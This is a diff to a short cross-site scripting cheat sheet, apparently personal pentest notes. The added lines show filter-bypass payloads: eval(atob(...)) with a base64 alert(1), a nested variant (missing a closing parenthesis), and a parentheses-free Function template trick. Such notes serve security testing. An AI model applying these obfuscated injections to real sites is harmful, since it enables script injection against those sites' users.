@@ -1,5 +1,17 @@
 # XSS
 
+eval(atob(b64\_payload)) can help with some bypasses (eval() can be nested)
+
+````javascript
+//eval("String" + <USER_INPUT>)
+eval(atob('YWxlcnQoMSk='))
+// Note above would be nested as:
+eval("String" + eval(atob('YWxlcnQoMSk='))
+
+//Avoid Parentheses 
+Function`x${'eval\x28atob\x28\x27YWxlcnQoMSk=\x27\x29\x29'}x```
+````
+
 Script for generating fetch commands
 
 ```bash
